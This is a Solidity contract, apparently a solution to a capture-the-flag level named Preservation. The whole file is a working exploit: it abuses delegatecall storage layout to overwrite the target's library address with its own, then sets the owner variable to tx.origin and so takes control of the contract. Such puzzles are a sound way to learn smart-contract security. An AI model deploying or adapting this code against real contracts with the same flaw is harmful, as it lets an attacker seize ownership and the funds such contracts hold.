pragma solidity ^0.4.23;

contract PreservationHack {
  // copy original contract data layout
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  
  function hack(address _preservation) public {
      Preservation preservation = Preservation(_preservation);
      // copy address of this library to the storage space 0
      preservation.setFirstTime(uint256(address(this)));
      // set "owner" variable at storage space 2
      preservation.setFirstTime(1);
  }

  function setTime(uint _hackData) public {
    _hackData;
    // this line will set us as the owner of the invoking contract
    // solium-disable-next-line security/no-tx-origin
    owner = tx.origin;
  }
}
